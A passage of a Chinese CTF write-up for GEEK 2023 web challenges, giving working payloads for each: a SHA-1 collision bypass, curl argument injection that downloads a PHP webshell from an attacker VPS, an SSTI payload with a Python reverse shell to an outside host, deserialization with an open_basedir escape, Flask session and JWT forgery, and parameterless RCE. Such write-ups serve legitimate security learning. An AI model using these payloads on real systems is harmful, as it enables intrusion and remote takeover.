class="keyword">echo</span> <span class="string">&quot;再绕最后一步吧&quot;</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="keyword">echo</span> <span class="string">&quot;好哩，快拿到flag啦&quot;</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;这里绕不过去，QW可不答应了哈&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;嘿嘿嘿，你别急啊&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;不会吧不会吧，不会第一步就卡住了吧，yxx会瞧不起你的！&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></blockquote><p>第1层：换行符绕过；</p><p>第2层：科学计数法绕 <code>intval()</code>；</p><p>第3层：sha1碰撞；</p><p>第4层：PHP解析特性。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">POST /?syc=Welcome%20to%20GEEK%202023!%0a&amp;lover=2e5 HTTP/1.1</span><br><span class="line">Host: h2y55ia9rcbaswjlhegv0qonf.node.game.sycsec.com</span><br><span class="line">Content-Length: 1320</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line"></span><br><span class="line">qw=%25PDF-1.3%0A%25%E2%E3%CF%D3%0A%0A%0A1%200%20obj%0A%3C%3C/Width%202%200%20R/Height%203%200%20R/Type%204%200%20R/Subtype%205%200%20R/Filter%206%200%20R/ColorSpace%207%200%20R/Length%208%200%20R/BitsPerComponent%208%3E%3E%0Astream%0A%FF%D8%FF%FE%00%24SHA-1%20is%20dead%21%21%21%21%21%85/%EC%09%239u%9C9%B1%A1%C6%3CL%97%E1%FF%FE%01%7FF%DC%93%A6%B6%7E%01%3B%02%9A%AA%1D%B2V%0BE%CAg%D6%88%C7%F8K%8CLy%1F%E0%2B%3D%F6%14%F8m%B1i%09%01%C5kE%C1S%0A%FE%DF%B7%608%E9rr/%E7%ADr%8F%0EI%04%E0F%C20W%0F%E9%D4%13%98%AB%E1.%F5%BC%94%2B%E35B%A4%80-%98%B5%D7%0F%2A3.%C3%7F%AC5%14%E7M%DC%0F%2C%C1%A8t%CD%0Cx0Z%21Vda0%97%89%60k%D0%BF%3F%98%CD%A8%04F%29%A1&amp;yxx=%25PDF-1.3%0A%25%E2%E3%CF%D3%0A%0A%0A1%200%20obj%0A%3C%3C/Width%202%200%20R/Height%203%200%20R/Type%204%200%20R/Subtype%205%200%20R/Filter%206%200%20R/ColorSpace%207%200%20R/Length%208%200%20R/BitsPerComponent%208%3E%3E%0Astream%0A%FF%D8%FF%FE%00%24SHA-1%20is%20dead%21%21%21%21%21%85/%EC%09%239u%9C9%B1%A1%C6%3CL%97%E1%FF%FE%01sF%DC%91f%B6%7E%11%8F%02%9A%B6%21%B2V%0F%F9%CAg%CC%A8%C7%F8%5B%A8Ly%03%0C%2B%3D%E2%18%F8m%B3%A9%09%01%D5%DFE%C1O%26%FE%DF%B3%DC8%E9j%C2/%E7%BDr%8F%0EE%BC%E0F%D2%3CW%0F%EB%14%13%98%BBU.%F5%A0%A8%2B%E31%FE%A4%807%B8%B5%D7%1F%0E3.%DF%93%AC5%00%EBM%DC%0D%EC%C1%A8dy%0Cx%2Cv%21V%60%DD0%97%91%D0k%D0%AF%3F%98%CD%A4%BCF%29%B1&amp;SYC[GEEK.2023=Happy to see you!</span><br></pre></td></tr></table></figure><p>​    </p><h3 id="ctf-curl"><a href="#ctf-curl" class="headerlink" title="ctf_curl"></a>ctf_curl</h3><blockquote><p>命令执行？真的吗？</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="string">&#x27;index.php&#x27;</span>);</span><br><span class="line"><span class="comment">// curl your domain</span></span><br><span class="line"><span class="comment">// flag is in /tmp/Syclover</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;addr&#x27;</span>])) &#123;</span><br><span class="line">    <span class="variable">$address</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;addr&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/;|f|:|\||\&amp;|!|&gt;|&lt;|`|\(|&#123;|\?|\n|\r/i&quot;</span>, <span class="variable">$address</span>))&#123;</span><br><span class="line">        <span class="variable">$result</span> = <span class="title function_ invoke__">system</span>(<span class="string">&quot;curl &quot;</span>.<span class="variable">$address</span>.<span class="string">&quot;&gt; /dev/null&quot;</span>);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;Hacker!!!&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></blockquote><p>利用VPS和curl写文件的参数：</p><p><code>?addr=-O%201.php%20x.x.x.x/1.txt</code></p><p>其中 <code>1.txt</code> 内容为：<code>&lt;?php system(&quot;cat /tmp/Syclover&quot;);?&gt;</code></p><p>访问 <code>1.php</code> 得flag。</p><p>​    </p><h3 id="klf-ssti"><a href="#klf-ssti" class="headerlink" title="klf_ssti"></a>klf_ssti</h3><blockquote><p>De1ty的广东朋友跟女神表白被骂klf，现在气急败坏，你知道klf是什么意思嘛？他现在依旧觉得他不是klf你们才是，你能拿到flag证明他是klf嘛…</p></blockquote><p>路由：<code>/hack?klf=xxx</code></p><p>无过滤，但也无输出的SSTI盲打，利用python反弹shell到VPS：</p><p><code>/hack?klf=&#123;%print(config.__class__.__init__.__globals__['os'].popen('python3 -c \'a=__import__;s=a("socket").socket;o=a("os").dup2;p=a("pty").spawn;c=s();c.connect(("x.x.x.x",7777));f=c.fileno;o(f(),0);o(f(),1);o(f(),2);p("/bin/sh")\' ').read())%&#125;</code></p><p>在根目录拿到flag。</p><p>​    </p><h3 id="ez-remove"><a href="#ez-remove" class="headerlink" title="ez_remove"></a>ez_remove</h3><blockquote><p>我想要回炉重造一波，怎么说，难道你不想吗</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">syc</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$lover</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="variable language_">$this</span>-&gt;lover);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;web&#x27;</span>]))&#123;</span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/lover/i&#x27;</span>,<span class="variable">$_GET</span>[<span class="string">&#x27;web&#x27;</span>]))&#123;</span><br><span class="line">        <span class="variable">$a</span>=<span class="title function_ invoke__">unserialize</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;web&#x27;</span>]);</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="built_in">Error</span>(<span class="string">&quot;快来玩快来玩~&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span>(<span class="string">&quot;nonono&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></blockquote><p>反序列化，用 <code>S</code> 绕关键字过滤，去最后大括号绕 <code>Exception</code>。</p><p>发现读不出根目录flag值，存在open_basedir，利用绕过命令读：</p><p><code>/?web=O:3:&quot;syc&quot;:1:&#123;S:5:&quot;\6cover&quot;;s:142:&quot;mkdir(&#39;test&#39;);chdir(&#39;test&#39;);ini_set(&#39;open_basedir&#39;,&#39;..&#39;);chdir(&#39;..&#39;);chdir(&#39;..&#39;);chdir(&#39;..&#39;);ini_set(&#39;open_basedir&#39;,&#39;/&#39;);readgzfile(&#39;/f1ger&#39;);&quot;;</code></p><p>​    </p><h3 id="ez-path"><a href="#ez-path" class="headerlink" title="ez_path"></a>ez_path</h3><blockquote><p>快来join我的博客吧！</p></blockquote><p>源码注释：<code>&lt;!--secret在根目录f14444文件里面，别忘记了--&gt;</code>。</p><p>首页得到泄露的文件 <code>app.cpython-39.pyc</code>，反编译得python源码：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> os, uuid</span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, render_template, request, redirect</span><br><span class="line">app = Flask(__name__)</span><br><span class="line">ARTICLES_FOLDER = <span class="string">&#x27;articles/&#x27;</span></span><br><span class="line">articles = []</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Article</span>:</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self, article_id, title, content</span>):</span><br><span class="line">        self.article_id = article_id</span><br><span class="line">        self.title = title</span><br><span class="line">        self.content = content</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">generate_article_id</span>():</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">str</span>(uuid.uuid4())</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">index</span>():</span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">&#x27;index.html&#x27;</span>, articles=articles)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/upload&#x27;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>, <span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">upload</span>():</span><br><span class="line">    <span class="keyword">if</span> request.method == <span class="string">&#x27;POST&#x27;</span>:</span><br><span class="line">        title = request.form[<span class="string">&#x27;title&#x27;</span>]</span><br><span class="line">        content = request.form[<span class="string">&#x27;content&#x27;</span>]</span><br><span class="line">        article_id = generate_article_id()</span><br><span class="line">        article = Article(article_id, title, content)</span><br><span class="line">        articles.append(article)</span><br><span class="line">        save_article(article_id, title, content)</span><br><span class="line">        <span class="keyword">return</span> redirect(<span class="string">&#x27;/&#x27;</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> render_template(<span class="string">&#x27;upload.html&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/article/&lt;article_id&gt;&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">article</span>(<span class="params">article_id</span>):</span><br><span class="line">    <span class="keyword">for</span> article <span class="keyword">in</span> articles:</span><br><span class="line">        <span class="keyword">if</span> article.article_id == article_id:</span><br><span class="line">            title = article.title</span><br><span class="line">            sanitized_title = sanitize_filename(title)</span><br><span class="line">            article_path = os.path.join(ARTICLES_FOLDER, sanitized_title)</span><br><span class="line">            <span class="keyword">with</span> <span class="built_in">open</span>(article_path, <span class="string">&#x27;r&#x27;</span>) <span class="keyword">as</span> (file):</span><br><span class="line">                content = file.read()</span><br><span class="line">            <span class="keyword">return</span> render_template(<span class="string">&#x27;articles.html&#x27;</span>, title=sanitized_title, content=content, article_path=article_path)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">&#x27;error.html&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">save_article</span>(<span class="params">article_id, title, content</span>):</span><br><span class="line">    sanitized_title = sanitize_filename(title)</span><br><span class="line">    article_path = ARTICLES_FOLDER + <span class="string">&#x27;/&#x27;</span> + sanitized_title</span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(article_path, <span class="string">&#x27;w&#x27;</span>) <span class="keyword">as</span> (file):</span><br><span class="line">        file.write(content)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">sanitize_filename</span>(<span class="params">filename</span>):</span><br><span class="line">    sensitive_chars = [<span class="string">&#x27;:&#x27;</span>, <span class="string">&#x27;*&#x27;</span>, <span class="string">&#x27;?&#x27;</span>, <span class="string">&#x27;&quot;&#x27;</span>, <span class="string">&#x27;&lt;&#x27;</span>, <span class="string">&#x27;&gt;&#x27;</span>, <span class="string">&#x27;|&#x27;</span>, <span class="string">&#x27;.&#x27;</span>]</span><br><span class="line">    <span class="keyword">for</span> char <span class="keyword">in</span> sensitive_chars:</span><br><span class="line">        filename = filename.replace(char, <span class="string">&#x27;_&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> filename</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    app.run(debug=<span class="literal">True</span>)</span><br></pre></td></tr></table></figure><p>利用绝对路径拼接漏洞：</p><blockquote><p>os.path.join(path,*paths)函数用于将多个文件路径连接成一个组合的路径。第一个函数通常包含了基础路径，而之后的每个参数被当作组件拼接到基础路径之后。<br>然而，这个函数有一个少有人知的特性，如果拼接的某个路径以 / 开头，那么包括基础路径在内的所有前缀路径都将被删除，该路径将视为绝对路径。</p></blockquote><p><code>os.path.join(&#39;articles/&#39;,&#39;/f14444&#39;)=&#39;/f14444&#39;</code></p><p>故在 <code>/upload</code> 路由，POST <code>title=/f14444&amp;content=qwe</code>，即可拿到flag。</p><p>​    </p><h3 id="you-konw-flask"><a href="#you-konw-flask" class="headerlink" title="you konw flask?"></a>you konw flask?</h3><blockquote><p>在驾校你不高低得当个教练？</p></blockquote><p>扫描出 <code>robots.txt</code>，泄露信息：<code>3ysd8.html</code>，源码里有注释：</p><p><code>&lt;!-- key是  app.secret_key = &#39;wanbao&#39;+base64.b64encode(str(random.randint(1, 100)).encode(&#39;utf-8&#39;)).decode(&#39;utf-8&#39;)+&#39;wanbao&#39; (www,我可爱的菀宝,我存的够安全的吧) --&gt;</code></p><p>制作爆破secret_key的字典：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line">g = <span class="built_in">open</span>(<span class="string">&#x27;dict.txt&#x27;</span>,<span class="string">&#x27;wb&#x27;</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">100</span>):</span><br><span class="line">    key = <span class="string">b&#x27;wanbao&#x27;</span>+base64.b64encode(<span class="built_in">str</span>(i).encode())+<span class="string">b&#x27;wanbao&#x27;</span></span><br><span class="line">    g.write(key)</span><br><span class="line">    g.write(<span class="string">b&#x27;\n&#x27;</span>)</span><br></pre></td></tr></table></figure><p>爆破flask session的secret_key：</p><p><code>flask-unsign --unsign --cookie &#39;eyJpc19hZG1pbiI6ZmFsc2UsIm5hbWUiOiJ4eHgiLCJ1c2VyX2lkIjozfQ.ZUOYig.x1sFiE5HRT9q5bGAwSF6wMnZfOM&#39; --wordlist dict.txt</code></p><p>得到secret_key后，伪造admin的flask session：</p><p><code>flask-unsign --sign --cookie &quot;&#123;&#39;is_admin&#39;: True, &#39;name&#39;: &#39;xxx&#39;, &#39;user_id&#39;: 3&#125;&quot; --secret &#39;wanbaoNTc=wanbao&#39;</code></p><p>进入学员管理页面，找到flag：</p><p><code>既然你是教练，那这个flag学员就交给你吧 SYC&#123;naCcuTYu2mu0c33Fen&#125;</code></p><p>​    </p><h3 id="Pupyy-rce"><a href="#Pupyy-rce" class="headerlink" title="Pupyy_rce"></a>Pupyy_rce</h3><blockquote><p>这是什么？执行一下</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="title function_ invoke__">header</span>(<span class="string">&#x27;Content-Type: text/html; charset=utf-8&#x27;</span>);</span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">include</span>(flag.php);</span><br><span class="line"><span class="comment">//当前目录下有好康的😋</span></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;var&#x27;</span>]) &amp;&amp; <span class="variable">$_GET</span>[<span class="string">&#x27;var&#x27;</span>]) &#123;</span><br><span class="line">    <span class="variable">$var</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;var&#x27;</span>];</span><br><span class="line">   </span><br><span class="line">    <span class="keyword">if</span> (!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/env|var|session|header/i&quot;</span>, <span class="variable">$var</span>,<span class="variable">$match</span>)) &#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="string">&#x27;;&#x27;</span> === <span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/[^\s\(\)]+?\((?R)?\)/&#x27;</span>, <span class="string">&#x27;&#x27;</span>, <span class="variable">$var</span>))&#123;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;var&#x27;</span>]);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">die</span>(<span class="string">&quot;WAF!!&quot;</span>);</span><br><span class="line">    &#125; <span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;PLZ DONT HCAK ME😅&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></blockquote><p>无参数RCE：<code>?var=print_r(scandir(current(localeconv())));</code></p><p>得到：</p><p><code>Array ( [0] =&gt; . [1] =&gt; .. [2] =&gt; error.log [3] =&gt; fl@g.php [4] =&gt; genshin01.txt [5] =&gt; index.php [6] =&gt; tiangou01.txt [7] =&gt; tiangou02.txt )</code></p><p>访问 <code>fl@g.php</code> 得flag。</p><p>​    </p><h3 id="雨"><a href="#雨" class="headerlink" title="雨"></a>雨</h3><blockquote><p>VanZY给白月光写了一张明信片，快去帮他把id签上吧</p></blockquote><p>访问 <code>/source</code> 没权限，提示 <code>&lt;!--Maybe you can view /hint--&gt;</code>。</p><p>访问 <code>/hint</code>，提示 <code>I heard that the challenge maker likes to use his own id as secret_key</code>。</p><p>使用<a href="https://jwt.io/">jwt.io</a>解析jwt，设置secret_key=VanZY，得到 <code>/source</code> 源码：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> express = <span class="built_in">require</span>(<span class="string">&#x27;express&#x27;</span>);</span><br><span class="line"><span class="keyword">const</span> jwt = <span class="built_in">require</span>(<span class="string">&#x27;jsonwebtoken&#x27;</span>);</span><br><span class="line"><span class="keyword">const</span> app = <span class="title function_">express</span>();</span><br><span class="line"><span class="keyword">const</span> bodyParser = <span class="built_in">require</span>(<span class="string">&#x27;body-parser&#x27;</span>)</span><br><span class="line"><span class="keyword">const</span> path = <span class="built_in">require</span>(<span class="string">&#x27;path&#x27;</span>);</span><br><span class="line"><span class="keyword">const</span> jwt_secret = <span class="string">&quot;VanZY&quot;</span>;</span><br><span class="line"><span class="keyword">const</span> cookieParser = <span class="built_in">require</span>(<span class="string">&#x27;cookie-parser&#x27;</span>);</span><br><span class="line"><span class="keyword">const</span> putil_merge = <span class="built_in">require</span>(<span class="string">&quot;putil-merge&quot;</span>)</span><br><span class="line">app.<span class="title function_">set</span>(<span class="string">&#x27;views&#x27;</span>, <span class="string">&#x27;./views&#x27;</span>);</span><br><span class="line">app.<span class="title function_">set</span>(<span class="string">&#x27;view engine&#x27;</span>, <span class="string">&#x27;ejs&#x27;</span>);</span><br><span class="line">app.<span class="title function_">use</span>(<span class="title function_">cookieParser</span>());</span><br><span class="line">app.<span class="title function_">use</span>(bodyParser.<span class="title function_">urlencoded</span>(&#123;<span class="attr">extended</span>: <span class="literal">true</span>&#125;)).<span class="title function_">use</span>(bodyParser.<span class="title function_">json</span>())</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> <span class="title class_">Super</span> = &#123;&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> safecode = <span class="keyword">function</span> (<span class="params">code</span>)&#123;</span><br><span class="line">    <span class="keyword">let</span> validInput = <span class="regexp">/global|mainModule|import|constructor|read|write|_load|exec|spawnSync|stdout|eval|stdout|Function|setInterval|setTimeout|var|\+|\*/ig</span>;</span><br><span class="line">    <span class="keyword">return</span> !validInput.<span class="title function_">test</span>(code);</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">app.<span class="title function_">all</span>(<span class="string">&#x27;/code&#x27;</span>, <span class="function">(<span class="params">req, res</span>) =&gt;</span> &#123;</span><br><span class="line">  res.<span class="title function_">type</span>(<span class="string">&#x27;html&#x27;</span>);</span><br><span class="line">  <span class="keyword">if</span> (req.<span class="property">method</span> == <span class="string">&quot;POST&quot;</span> &amp;&amp; req.<span class="property">body</span>) &#123;</span><br><span class="line">    <span class="title function_">putil_merge</span>(&#123;&#125;, req.<span class="property">body</span>, &#123;<span class="attr">deep</span>:<span class="literal">true</span>&#125;);</span><br><span class="line">  &#125;</span><br><span class="line">  res.<span class="title function_">send</span>(<span class="string">&quot;welcome to code&quot;</span>);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">app.<span class="title function_">all</span>(<span class="string">&#x27;/hint&#x27;</span>, <span class="function">(<span class="params">req, res</span>) =&gt;</span> &#123;</span><br><span class="line">    res.<span class="title function_">type</span>(<span class="string">&#x27;html&#x27;</span>);</span><br><span class="line">    res.<span class="title function_">send</span>(<span class="string">&quot;I heard that the challenge maker likes to use his own id as secret_key&quot;</span>);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">app.<span class="title function_">get</span>(<span class="string">&#x27;/source&#x27;</span>, <span class="function">(<span class="params">req, res</span>) =&gt;</span> &#123;</span><br><span class="line">  res.<span class="title function_">type</span>(<span class="string">&#x27;html&#x27;</span>);</span><br><span class="line">  <span class="keyword">var</span> auth = req.<span class="property">cookies</span>.<span class="property">auth</span>;</span><br><span class="line">  jwt.<span class="title function_">verify</span>(auth, jwt_secret , <span class="keyword">function</span>(<span class="params">err, decoded</span>) &#123;</span><br><span class="line">    <span class="keyword">try</span>&#123;</span><br><span class="line">      <span class="keyword">if</span>(decoded.<span class="property">user</span>===<span class="string">&#x27;admin&#x27;</span>)&#123;</span><br><span class="line">        res.<span class="title function_">sendFile</span>(path.<span class="title function_">join</span>(__dirname + <span class="string">&#x27;/index.js&#x27;</span>));</span><br><span class="line">      &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        res.<span class="title function_">send</span>(<span class="string">&#x27;you are not admin    &lt;!--Maybe you can view /hint--&gt;&#x27;</span>);</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">catch</span>&#123;</span><br><span class="line">      res.<span class="title function_">send</span>(<span class="string">&quot;Fuck you Hacker!!!&quot;</span>)</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">app.<span class="title function_">all</span>(<span class="string">&#x27;/create&#x27;</span>, <span class="function">(<span class="params">req, res</span>) =&gt;</span> &#123;</span><br><span class="line">  res.<span class="title function_">type</span>(<span class="string">&#x27;html&#x27;</span>);</span><br><span class="line">  <span class="keyword">if</span> (!req.<span class="property">body</span>.<span class="property">name</span> || req.<span class="property">body</span>.<span class="property">name</span> === <span class="literal">undefined</span> || req.<span class="property">body</span>.<span class="property">name</span> === <span class="literal">null</span>)&#123;</span><br><span class="line">    res.<span class="title function_">send</span>(<span class="string">&quot;please input name&quot;</span>);</span><br><span class="line">  &#125;<span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="title class_">Super</span>[<span class="string">&#x27;userrole&#x27;</span>] === <span class="string">&#x27;Superadmin&#x27;</span>) &#123;</span><br><span class="line">        res.<span class="title function_">render</span>(<span class="string">&#x27;index&#x27;</span>, req.<span class="property">body</span>);</span><br><span class="line">      &#125;<span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (!<span class="title function_">safecode</span>(req.<span class="property">body</span>.<span class="property">name</span>)) &#123;</span><br><span class="line">            res.<span class="title function_">send</span>(<span 